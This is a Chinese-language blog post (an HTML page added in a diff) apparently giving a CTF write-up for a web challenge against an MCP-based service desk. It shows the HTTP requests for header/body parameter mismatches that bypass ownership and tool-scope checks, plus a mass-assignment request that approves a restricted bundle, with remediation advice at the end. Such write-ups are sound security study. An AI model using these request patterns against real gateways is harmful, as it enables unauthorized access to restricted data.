@@ -1,0 +1,561 @@
+
+<!DOCTYPE html>
+<html lang="zh" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <script>
+        (function () {
+            try {
+                var t = localStorage.getItem('february-theme');
+                if (t !== 'dark' && t !== 'light') {
+                    t = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+                }
+                document.documentElement.setAttribute('data-theme', t);
+                document.documentElement.style.colorScheme = t;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+            }
+        })();
+    </script>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>2026-10-31-NESTCTF-northline - 二月の档案室</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="二月, 博客, 技术, 分享, 记录, 学习, 分享, 记录, 档案室, 技术分享,  february, blog, technology, share, record, learn, share, record, archive, technology share,"> 
+    <meta name="description" content="我不相信命运，且我将在醉生梦死中追寻真正的自我。,
+资料说明：原记录中提及的本机脚本及题目附件未随本文附上，相关文件名仅用于说明当时的复现流程。
+
+Crossed Signals（Northline Service Desk）· 四层门，全靠“同一,"> 
+    <meta name="author" content="Allureluoli"> 
+    <link rel="alternative" href="atom.xml" title="二月の档案室" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="2026-10-31-NESTCTF-northline - 二月の档案室"/>
+    <meta name="twitter:description" content="我不相信命运，且我将在醉生梦死中追寻真正的自我。,
+资料说明：原记录中提及的本机脚本及题目附件未随本文附上，相关文件名仅用于说明当时的复现流程。
+
+Crossed Signals（Northline Service Desk）· 四层门，全靠“同一,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="二月の档案室"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="2026-10-31-NESTCTF-northline - 二月の档案室"/>
+    <meta property="og:description" content="我不相信命运，且我将在醉生梦死中追寻真正的自我。,
+资料说明：原记录中提及的本机脚本及题目附件未随本文附上，相关文件名仅用于说明当时的复现流程。
+
+Crossed Signals（Northline Service Desk）· 四层门，全靠“同一,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+<link rel="stylesheet" href="/css/february.css">
+
+    <meta name="theme-color" content="#faf9f5" />
+    <script>window.searchDbPath = "/search.xml";</script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">二月の档案室</span>
+    <div id="loader"></div>
+    <div class="f-progress" id="f-progress" aria-hidden="true"></div>
+
+    
+<header class="f-dock" id="f-dock">
+    <a class="f-brand" href="/" aria-label="回到首页">
+        <img class="f-brand-avatar" src="/img/avatar.jpg" alt="Allureluoli" width="28" height="28">
+        <span class="f-brand-text">二月<em>FEBRUARY</em></span>
+    </a>
+
+    <nav class="f-dock-links" aria-label="主导航">
+        
+        <a href="/">首页</a>
+        
+        <a href="/categories/">分类</a>
+        
+        <a href="/tags/">标签</a>
+        
+        <a href="/archives/">归档</a>
+        
+        <a href="/about/">关于</a>
+        
+    </nav>
+
+    <div class="f-dock-actions">
+        
+
+        
+        <button class="f-dock-btn icon-play f-play-btn" id="f-play" type="button" title="播放 / 暂停" aria-label="播放或暂停音乐">
+            <svg class="f-play-ico--play" viewBox="0 0 24 24" aria-hidden="true"><path d="M8 5.5v13l11-6.5z" fill="currentColor"/></svg>
+            <svg class="f-play-ico--pause" viewBox="0 0 24 24" aria-hidden="true"><rect x="7" y="5.5" width="3.4" height="13" rx="1.2" fill="currentColor"/><rect x="13.6" y="5.5" width="3.4" height="13" rx="1.2" fill="currentColor"/></svg>
+        </button>
+        
+
+        <button class="f-dock-btn f-theme-btn" id="f-theme" type="button" title="切换深浅色" aria-label="切换深浅色">
+            <svg class="f-ico-moon" viewBox="0 0 24 24" aria-hidden="true"><path d="M21 13.2A8.5 8.5 0 1 1 10.8 3a7 7 0 1 0 10.2 10.2z" fill="currentColor"/></svg>
+            <svg class="f-ico-sun" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="4.2" fill="currentColor"/><path d="M12 2.5v2.2M12 19.3v2.2M2.5 12h2.2M19.3 12h2.2M5.2 5.2l1.6 1.6M17.2 17.2l1.6 1.6M18.8 5.2l-1.6 1.6M6.8 17.2l-1.6 1.6" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+        </button>
+
+        <button class="f-dock-btn f-dock-menu switchmenu" type="button" title="菜单" aria-label="打开菜单" aria-expanded="false">
+            <span aria-hidden="true"></span><span aria-hidden="true"></span>
+        </button>
+    </div>
+</header>
+
+    
+<div class="nav" id="f-menu" aria-hidden="true">
+    <div class="f-menu-inner">
+        <p class="f-menu-kicker"><span class="f-pulse"></span>NAVIGATION</p>
+
+        <ul id="menu-menu" class="menu">
+            
+            <li class="pview menu-item" style="--i:0">
+                <a href="/" title="首页">
+                    <span class="f-menu-num">01</span>
+                    <span class="f-menu-text">首页</span>
+                </a>
+            </li>
+            
+            <li class="pview menu-item" style="--i:1">
+                <a href="/categories/" title="分类">
+                    <span class="f-menu-num">02</span>
+                    <span class="f-menu-text">分类</span>
+                </a>
+            </li>
+            
+            <li class="pview menu-item" style="--i:2">
+                <a href="/tags/" title="标签">
+                    <span class="f-menu-num">03</span>
+                    <span class="f-menu-text">标签</span>
+                </a>
+            </li>
+            
+            <li class="pview menu-item" style="--i:3">
+                <a href="/archives/" title="归档">
+                    <span class="f-menu-num">04</span>
+                    <span class="f-menu-text">归档</span>
+                </a>
+            </li>
+            
+            <li class="pview menu-item" style="--i:4">
+                <a href="/about/" title="关于">
+                    <span class="f-menu-num">05</span>
+                    <span class="f-menu-text">关于</span>
+                </a>
+            </li>
+            
+        </ul>
+
+        <div class="hitokoto">
+            <span class="typed" id="hitokoto" data-st="true">「我不相信命运，且我将在醉生梦死中追寻真正的自我。」</span>
+        </div>
+
+        <p class="footerlinks">
+            
+            <a target="_blank" rel="noopener" href="https://x.com/DevilC1875" title="X" aria-label="X">X</a>
+            
+            <a target="_blank" rel="noopener" href="https://github.com/allureluoli/" title="GitHub" aria-label="GitHub">GitHub</a>
+            
+            <a href="weixin://dl/chat?moonfebruarymoon" title="微信" aria-label="微信">微信</a>
+            
+            <a href="mailto:3345483363@qq.com" title="Email" aria-label="Email">Email</a>
+            
+        </p>
+
+        <p id="copyright">
+            &copy; 2026 Allureluoli
+            <span>·</span> Powered by Hexo
+            <span>·</span> Theme Diaspora
+        </p>
+    </div>
+</div>
+
+
+    
+<div id="single" class="f-post">
+    
+<header class="f-post-hero" style="--f-cover:url('/img/cover.jpg')">
+    <div class="f-post-hero-bg"></div>
+    <div class="f-post-hero-veil"></div>
+    <div class="f-post-hero-inner">
+        <nav class="f-crumbs" aria-label="面包屑">
+            <a href="/">首页</a>
+            <span aria-hidden="true">/</span>
+            
+            <span class="f-crumb-cur">正文</span>
+        </nav>
+
+        <h1 class="f-post-title">2026-10-31-NESTCTF-northline</h1>
+
+        <div class="f-post-meta">
+            <span class="f-meta-item">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><rect x="3" y="5" width="18" height="16" rx="3" fill="none" stroke="currentColor" stroke-width="1.8"/><path d="M3 10h18M8 3v4M16 3v4" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
+                <time datetime="2026-10-31T08:00:00.000Z">2026-10-31</time>
+            </span>
+            <span class="f-meta-item">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="8.5" fill="none" stroke="currentColor" stroke-width="1.8"/><path d="M12 7v5.2l3.2 2" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
+                11 min read
+            </span>
+            <span class="f-meta-item">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 5h16M4 12h10M4 19h13" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
+                5.1k 字
+            </span>
+            
+        </div>
+
+        
+        <div class="f-post-tags">
+            
+            <a class="f-tag" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">#网络安全</a>
+            
+            <a class="f-tag" href="/tags/CTF/">#CTF</a>
+            
+            <a class="f-tag" href="/tags/Web/">#Web</a>
+            
+            <a class="f-tag" href="/tags/MCP/">#MCP</a>
+            
+        </div>
+        
+    </div>
+</header>
+
+
+    <div class="f-post-wrap">
+        <article class="f-post-main">
+            <div class="content markdown f-content">
+                <blockquote>
+<p>资料说明：原记录中提及的本机脚本及题目附件未随本文附上，相关文件名仅用于说明当时的复现流程。</p>
+</blockquote>
+<h3 id="Crossed-Signals（Northline-Service-Desk）·-四层门，全靠“同一个值传两遍、两侧不同源”"><a href="#Crossed-Signals（Northline-Service-Desk）·-四层门，全靠“同一个值传两遍、两侧不同源”" class="headerlink" title="Crossed Signals（Northline Service Desk）· 四层门，全靠“同一个值传两遍、两侧不同源”"></a>Crossed Signals（Northline Service Desk）· 四层门，全靠“同一个值传两遍、两侧不同源”</h3><blockquote>
+<p>平台题目名：<strong>Crossed Signals</strong>（Web，655 分，10:19:33 提交）。内部代号 <code>northline</code>，目标 <code>zu9tte01</code>。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;IcP9omrAE0EKo5gRrcUafl8LYiyFaEH1cD4tuj3F&#125;</span><br></pre></td></tr></table></figure>
+
+<p>目标：<code>http://zu9tte01.nestctf.cyberpeace.cn:58080/</code>（内网 <code>172.78.112.236</code>）<br>凭据：<code>advisor@northline.test</code> &#x2F; <code>Service-Desk-2026</code>（题面给的服务台账号）<br>复现：<code>py -3.13 solve_final.py</code></p>
+<h4 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h4><p>整题的骨架是 <strong>“同一个语义值在请求里出现两次，而校验与执行各自只看其中一次”</strong>：VIN 走 HTTP 头与 JSON body 各一份、工具名走 <code>Mcp-Name</code> 头与 <code>params.name</code> 各一份、bundle 的 release 状态走 notes 接口的批量赋值。三处错位叠起来，把受限车辆的 <code>private/recovery.txt</code> 从封存包里取了出来。</p>
+<h4 id="0-攻击面"><a href="#0-攻击面" class="headerlink" title="0. 攻击面"></a>0. 攻击面</h4><table>
+<thead>
+<tr>
+<th>通道</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>REST</td>
+<td><code>POST /api/login</code>、<code>GET /api/me</code>、<code>GET /api/cases</code>、<code>POST /api/bundles/&lt;id&gt;/notes</code>、<code>GET /api/bundles/&lt;id&gt;/download</code></td>
+</tr>
+<tr>
+<td>MCP</td>
+<td><code>POST /mcp</code>，JSON-RPC 2.0，<code>MCP-Protocol-Version: 2026-07-28</code>，工具参数 schema 里带 <code>x-mcp-header</code> 映射</td>
+</tr>
+</tbody></table>
+<p>登录后 <code>/api/me</code>：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;advisor@northline.test&quot;</span><span class="punctuation">,</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;service_advisor&quot;</span><span class="punctuation">,</span><span class="attr">&quot;fleet&quot;</span><span class="punctuation">:</span><span class="string">&quot;West depot&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;assigned_vins&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;CTF6SVC0000000001&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;tool_endpoint&quot;</span><span class="punctuation">:</span><span class="string">&quot;/mcp&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>/api/cases</code> 里目标工单 <code>SR-26042</code>：VIN <code>CTF6SVC0000000002</code>、<code>access:&quot;restricted&quot;</code>、<code>fleet:&quot;Factory validation&quot;</code>、<code>status:&quot;Security review&quot;</code>。页面自己都写着：</p>
+<blockquote>
+<p>Cross-fleet case metadata is visible; vehicle data is restricted.</p>
+</blockquote>
+<p><code>tools/list</code> 给三个工具：<code>get_vehicle_health</code>、<code>get_update_status</code>、<code>export_case_bundle(vin, case_id, diagnostic_ref, evidence_ref)</code>。关键在于每个参数 schema 都标了 <code>&quot;x-mcp-header&quot;: &quot;VIN&quot;</code> —— 这就是“同一值两份”的伏笔。</p>
+<h4 id="1-门一：VIN-头-体错位"><a href="#1-门一：VIN-头-体错位" class="headerlink" title="1. 门一：VIN 头&#x2F;体错位"></a>1. 门一：VIN 头&#x2F;体错位</h4><p>前端 <code>/app.js</code> 的 <code>sendMcp()</code>：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">request.<span class="property">params</span>.<span class="property">arguments</span> = &#123;<span class="attr">vin</span>: record.<span class="property">vin</span>&#125;;</span><br><span class="line">headers[<span class="string">&quot;Mcp-Param-VIN&quot;</span>] = record.<span class="property">vin</span>;   <span class="comment">// 网关按这个做归属校验</span></span><br></pre></td></tr></table></figure>
+
+<p>官方客户端永远让头和体相等，所以没人会发现网关只认头。把头填<strong>自己</strong>被分配的 VIN、体填<strong>受限</strong>那台车的 VIN：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /mcp</span><br><span class="line"><span class="attribute">MCP-Protocol-Version</span><span class="punctuation">: </span>2026-07-28</span><br><span class="line"><span class="attribute">Mcp-Method</span><span class="punctuation">: </span>tools/call</span><br><span class="line"><span class="attribute">Mcp-Name</span><span class="punctuation">: </span>get_vehicle_health</span><br><span class="line"><span class="attribute">Mcp-Param-VIN</span><span class="punctuation">: </span>CTF6SVC0000000001</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer &lt;token&gt;</span><br><span class="line"></span><br><span class="line">&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:1,&quot;method&quot;:&quot;tools/call&quot;,&quot;params&quot;:&#123;</span><br><span class="line">  &quot;_meta&quot;:&#123;&quot;io.modelcontextprotocol/protocolVersion&quot;:&quot;2026-07-28&quot;,</span><br><span class="line">           &quot;io.modelcontextprotocol/clientInfo&quot;:&#123;&quot;name&quot;:&quot;northline-service-console&quot;,&quot;version&quot;:&quot;1.0.0&quot;&#125;,</span><br><span class="line">           &quot;io.modelcontextprotocol/clientCapabilities&quot;:&#123;&#125;&#125;,</span><br><span class="line">  &quot;name&quot;:&quot;get_vehicle_health&quot;,&quot;arguments&quot;:&#123;&quot;vin&quot;:&quot;CTF6SVC0000000002&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拿到两个令牌：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">diagnostic_ref = DX-eba5efee02b906534298210d</span><br><span class="line">evidence_ref   = EV-e82c2be41c791acb2e85d921</span><br></pre></td></tr></table></figure>
+
+<p>坑：<code>_meta</code> 的三段元数据缺一个就 <code>-32600 Invalid request metadata</code>；<code>Mcp-Method</code> 和 body 里的 <code>method</code> 不一致则 <code>-32020 HeaderMismatch</code>。</p>
+<h4 id="2-门二：工具-scope-也看头不看体"><a href="#2-门二：工具-scope-也看头不看体" class="headerlink" title="2. 门二：工具 scope 也看头不看体"></a>2. 门二：工具 scope 也看头不看体</h4><p><code>export_case_bundle</code> 是 security operations 专用，直接调 → <code>403 &#123;&quot;error&quot;:&quot;tool_scope_denied&quot;&#125;</code>。<br>网关按 <strong><code>Mcp-Name</code> 头</strong>判 scope，执行器按 <strong><code>params.name</code></strong> 派发：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Mcp-Name</span><span class="punctuation">: </span>get_vehicle_health          # 网关眼里这是只读工具</span><br><span class="line">&#123;&quot;name&quot;:&quot;export_case_bundle&quot;,&quot;arguments&quot;:&#123;&quot;vin&quot;:&quot;CTF6SVC0000000002&quot;,&quot;case_id&quot;:&quot;SR-26042&quot;,</span><br><span class="line">  &quot;diagnostic_ref&quot;:&quot;DX-...&quot;,&quot;evidence_ref&quot;:&quot;EV-...&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>→ <code>200</code>，返回 <code>bundle_id</code> 和一段 base64 的 <code>SR-26042-advisor-preview.zip</code>。预览包的 <code>manifest.json</code> 老实列出了三条：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;entries&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;diagnostics/telemetry.json&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;diagnostics/update-history.json&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;private/recovery.txt&quot;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
+
+<p>但预览 zip 只有前两条（<code>private/</code> 被裁掉），且 <code>release_state: &quot;pending&quot;</code> —— 预览包泄露了私有条目名，这是第二个设计问题。</p>
+<h4 id="3-门三：release-状态靠批量赋值"><a href="#3-门三：release-状态靠批量赋值" class="headerlink" title="3. 门三：release 状态靠批量赋值"></a>3. 门三：release 状态靠批量赋值</h4><p><code>GET /api/bundles/&lt;id&gt;/download</code> → <code>403 &#123;&quot;error&quot;:&quot;bundle_release_pending&quot;,&quot;required_release_state&quot;:&quot;approved&quot;&#125;</code>。<br>服务端没有 approve&#x2F;release 端点，但 notes 接口把请求体<strong>整个</strong>回写进 bundle 记录：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /api/bundles/&lt;id&gt;/notes</span><br><span class="line">&#123;&quot;note&quot;:&quot;security-operations review complete&quot;,&quot;release_state&quot;:&quot;approved&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>（只发 <code>&#123;&quot;note&quot;:&quot;x&quot;&#125;</code> 是 200 但状态仍是 pending；<code>release_state</code> &#x2F; <code>state</code> &#x2F; <code>status</code> &#x2F; <code>approve</code> &#x2F; <code>action</code> &#x2F; <code>role</code> &#x2F; <code>scope</code> 任一都能被吸收成 approved。）</p>
+<h4 id="4-开箱"><a href="#4-开箱" class="headerlink" title="4. 开箱"></a>4. 开箱</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/bundles/&lt;id&gt;/download  -&gt;  200，真 zip（1287 B）</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">private/recovery.txt</span><br><span class="line">NORTHLINE / SECURITY OPERATIONS</span><br><span class="line">Case: SR-26042</span><br><span class="line">Vehicle: CTF6SVC0000000002</span><br><span class="line">Recovery token: flag&#123;IcP9omrAE0EKo5gRrcUafl8LYiyFaEH1cD4tuj3F&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-脚本"><a href="#5-脚本" class="headerlink" title="5. 脚本"></a>5. 脚本</h4><p><code>solve_final.py</code> 一条链跑完：登录 → 头&#x2F;体错位取两个 ref → <code>Mcp-Name</code> 错位导出 → notes 批量赋值批准 → 下载解压 → 正则取 token。二次运行 token 稳定。</p>
+<h4 id="6-顺手记下的接口细节"><a href="#6-顺手记下的接口细节" class="headerlink" title="6. 顺手记下的接口细节"></a>6. 顺手记下的接口细节</h4><table>
+<thead>
+<tr>
+<th>端点</th>
+<th>行为</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>POST /api/login</code></td>
+<td><code>&#123;username,password&#125;</code> → <code>&#123;token,expires_in,role&#125;</code>；token 是 32 字节 base64url，不是 JWT</td>
+</tr>
+<tr>
+<td><code>GET /api/me</code></td>
+<td>含 <code>assigned_vins</code>、<code>tool_endpoint</code>、<code>protocol_version</code></td>
+</tr>
+<tr>
+<td><code>GET /api/cases</code></td>
+<td>跨车队元数据可见，<code>access</code> 区分 assigned &#x2F; restricted</td>
+</tr>
+<tr>
+<td><code>POST /api/bundles/&lt;id&gt;/notes</code></td>
+<td><code>note</code> 必填（<code>&#123;&#125;</code> → <code>invalid_note</code>），<strong>其余任意字段被回写进记录</strong></td>
+</tr>
+<tr>
+<td><code>GET /api/bundles/&lt;id&gt;/download</code></td>
+<td>需 <code>release_state=approved</code></td>
+</tr>
+<tr>
+<td><code>PATCH</code> &#x2F; <code>PUT</code></td>
+<td>501（服务端只实现 GET&#x2F;POST）</td>
+</tr>
+<tr>
+<td><code>resources/*</code>、<code>prompts/*</code></td>
+<td><code>unsupported_method</code>（网关只做 tools）</td>
+</tr>
+</tbody></table>
+<h4 id="7-踩坑"><a href="#7-踩坑" class="headerlink" title="7. 踩坑"></a>7. 踩坑</h4><table>
+<thead>
+<tr>
+<th>坑</th>
+<th>现象</th>
+<th>解决</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>_meta</code> 元数据</td>
+<td><code>-32600 Invalid request metadata</code></td>
+<td>三个 <code>io.modelcontextprotocol/*</code> 字段一个都不能少</td>
+</tr>
+<tr>
+<td><code>Mcp-Method</code> 与 body 不符</td>
+<td><code>-32020 HeaderMismatch</code></td>
+<td>头与 body 的 method 必须一致</td>
+</tr>
+<tr>
+<td>只填头不填体</td>
+<td>仍然 403</td>
+<td>两处都要改：头放自己、体放目标</td>
+</tr>
+<tr>
+<td>notes 只发 note</td>
+<td>200 但仍 pending</td>
+<td>必须显式塞 <code>release_state:&quot;approved&quot;</code></td>
+</tr>
+</tbody></table>
+<h4 id="8-修复建议"><a href="#8-修复建议" class="headerlink" title="8. 修复建议"></a>8. 修复建议</h4><ol>
+<li>VIN 只保留一个真源：只信 <code>Mcp-Param-VIN</code> 或只信 body，二者不一致直接 400。</li>
+<li>工具 scope 用 body 的 <code>name</code> 判，不要用可伪造的头。</li>
+<li>notes 接口做字段白名单，<code>release_state</code> 只能由服务端状态机推进（且需要 security 角色）。</li>
+<li>预览包不要和完整包共享同一份 manifest，私有条目名本身就是信息泄露。</li>
+</ol>
+<h4 id="9-一句话总结"><a href="#9-一句话总结" class="headerlink" title="9. 一句话总结"></a>9. 一句话总结</h4><p>MCP 这类“头 + JSON-RPC body”双通道的接口，天生适合出<strong>参数错位</strong>题：网关为了做鉴权&#x2F;限流会把关键参数提到头里，而执行层又从 body 里取。<strong>只要两处不是同一个来源，就一定有一处是假的。</strong></p>
+
+                <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+                <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                    <source type="audio/mpeg" src="">
+                </audio>
+                
+                <ul id="audio-list" style="display:none">
+                    
+                    
+                    <li title="0" data-url="https://blog.curesky.site/audio/yinlang.mp3"></li>
+                    
+                    
+                </ul>
+                
+            </div>
+
+            
+<section class="f-copyright">
+    <div class="f-copy-main">
+        <p class="f-copy-title">本文作者 <b>Allureluoli</b></p>
+        <p class="f-copy-text">文字版权归作者所有，转载请注明出处；商业用途请先联系二月。</p>
+    </div>
+    <div class="f-copy-side">
+        <span>CC BY-NC-ND 4.0</span>
+        <a href="/2026/10/31/2026-10-31-NESTCTF-northline/" target="_blank" rel="noopener">原文链接 ↗</a>
+    </div>
+</section>
+
+
+<nav class="f-pn" aria-label="上一篇 / 下一篇">
+    
+    <a class="f-pn-card f-pn-prev" href="/2026/10/31/2026-10-31-NESTCTF-WP/">
+        <span class="f-pn-label">← 更新的文章</span>
+        <span class="f-pn-title">2026-10-31-NESTCTF-WP</span>
+        <span class="f-pn-date">2026-10-31</span>
+    </a>
+    
+    
+    <a class="f-pn-card f-pn-next" href="/2026/10/31/2026-10-31-NESTCTF-permeate/">
+        <span class="f-pn-label">更早的文章 →</span>
+        <span class="f-pn-title">2026-10-31-NESTCTF-permeate</span>
+        <span class="f-pn-date">2026-10-31</span>
+    </a>
+    
+</nav>
+
+
+<div class="f-comments">
+    <p class="f-comments-title">评论<em>COMMENTS</em></p>
+    
+<div id="gitalk-container" class="comment link"
+    data-enable="true"
+    data-ae="true"
+    data-ci="10a7f71656553fd4676c"
+    data-cs="48f8d183288b4d0b2531f047719dee43bdc913ec"
+    data-r="allureluoli.github.io"
+    data-o="allureluoli"
+    data-a="allureluoli"
+    data-d="false"
+>查看评论 · 基于 GitHub Issues</div>
+
+
+</div>
+
+        </article>
+
+        <aside class="f-post-aside">
+            
+            <div class="f-toc-card" id="f-toc-card">
+                <p class="f-toc-title">目录<em>CONTENTS</em></p>
+                <div class="f-toc-body"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Crossed-Signals%EF%BC%88Northline-Service-Desk%EF%BC%89%C2%B7-%E5%9B%9B%E5%B1%82%E9%97%A8%EF%BC%8C%E5%85%A8%E9%9D%A0%E2%80%9C%E5%90%8C%E4%B8%80%E4%B8%AA%E5%80%BC%E4%BC%A0%E4%B8%A4%E9%81%8D%E3%80%81%E4%B8%A4%E4%BE%A7%E4%B8%8D%E5%90%8C%E6%BA%90%E2%80%9D"><span class="toc-text">Crossed Signals（Northline Service Desk）· 四层门，全靠“同一个值传两遍、两侧不同源”</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-text">一句话</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0-%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-text">0. 攻击面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E9%97%A8%E4%B8%80%EF%BC%9AVIN-%E5%A4%B4-%E4%BD%93%E9%94%99%E4%BD%8D"><span class="toc-text">1. 门一：VIN 头&#x2F;体错位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E9%97%A8%E4%BA%8C%EF%BC%9A%E5%B7%A5%E5%85%B7-scope-%E4%B9%9F%E7%9C%8B%E5%A4%B4%E4%B8%8D%E7%9C%8B%E4%BD%93"><span class="toc-text">2. 门二：工具 scope 也看头不看体</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E9%97%A8%E4%B8%89%EF%BC%9Arelease-%E7%8A%B6%E6%80%81%E9%9D%A0%E6%89%B9%E9%87%8F%E8%B5%8B%E5%80%BC"><span class="toc-text">3. 门三：release 状态靠批量赋值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%BC%80%E7%AE%B1"><span class="toc-text">4. 开箱</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E8%84%9A%E6%9C%AC"><span class="toc-text">5. 脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E9%A1%BA%E6%89%8B%E8%AE%B0%E4%B8%8B%E7%9A%84%E6%8E%A5%E5%8F%A3%E7%BB%86%E8%8A%82"><span class="toc-text">6. 顺手记下的接口细节</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E8%B8%A9%E5%9D%91"><span class="toc-text">7. 踩坑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-text">8. 修复建议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%80%BB%E7%BB%93"><span class="toc-text">9. 一句话总结</span></a></li></ol></li></ol></div>
+            </div>
+            
+        </aside>
+    </div>
+</div>
+
+
+    
+<footer class="f-footer">
+    <span class="f-footer-glow" aria-hidden="true"></span>
+    <div class="f-footer-inner">
+        <a class="f-footer-brand" href="/">
+            <img class="f-footer-avatar" src="/img/avatar.jpg" alt="Allureluoli" width="34" height="34">
+            <span>二月の档案室<em>FEBRUARY · ARCHIVE</em></span>
+        </a>
+
+        <p class="f-footer-quote">
+            <span class="f-footer-quote-zh">我不相信命运，且我将在醉生梦死中追寻真正的自我。</span>
+            <span class="f-footer-quote-en">I do not believe in fate. In wine and dreams, I will seek out my true self.</span>
+        </p>
+
+        <div class="f-footer-links">
+            
+            <a href="https://x.com/DevilC1875" target="_blank" rel="noopener">X</a>
+            
+            <a href="https://github.com/allureluoli/" target="_blank" rel="noopener">GitHub</a>
+            
+            <a href="weixin://dl/chat?moonfebruarymoon" target="_blank" rel="noopener">微信</a>
+            
+            <a href="mailto:3345483363@qq.com" target="_blank" rel="noopener">Email</a>
+            
